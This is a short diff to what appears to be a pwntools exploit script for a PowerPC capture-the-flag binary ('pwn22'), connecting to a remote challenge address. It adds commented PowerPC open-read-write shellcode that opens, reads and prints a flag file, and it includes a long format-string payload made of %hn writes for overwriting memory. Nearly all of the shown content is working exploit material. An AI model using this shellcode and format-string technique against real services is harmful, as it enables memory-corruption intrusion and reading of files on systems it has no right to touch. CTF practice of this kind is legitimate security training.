@@ -28,6 +28,24 @@ if __name__ == '__main__':
 #	io = process(['/usr/bin/qemu-ppc','-g','1275','./pwn22_patch'])
 	io = remote('150.158.156.120',23333)
 
+	#ORW
+	'''
+	mr r31, r9
+	addi r3, r31, 0x500-4
+	li r0, 5
+	li r4, 0
+	sc #Open flag
+	li r0, 3
+	mr r4, r24
+	li r5, 100
+	li r3, 0
+	sc #Read
+	li r0, 4
+	mr r4, r24
+	li r3, 1
+	sc #Write
+	'''
+
 	B_fsb = b'A%83$hnA%84$hn%85$hn%86$hnA%87$hnA%88$hnA%89$hn%95c%90$hn'+\
 		'%1176c%91$hn%2830c%92$hn%1138c%93$hn%9092c%94$hn%95$hn%96$hn'+\
 		'%96c%97$hn%98$hn%31c%99$hnA%100$hn%32c%101$hn%2912c%102$n%103$n'+\
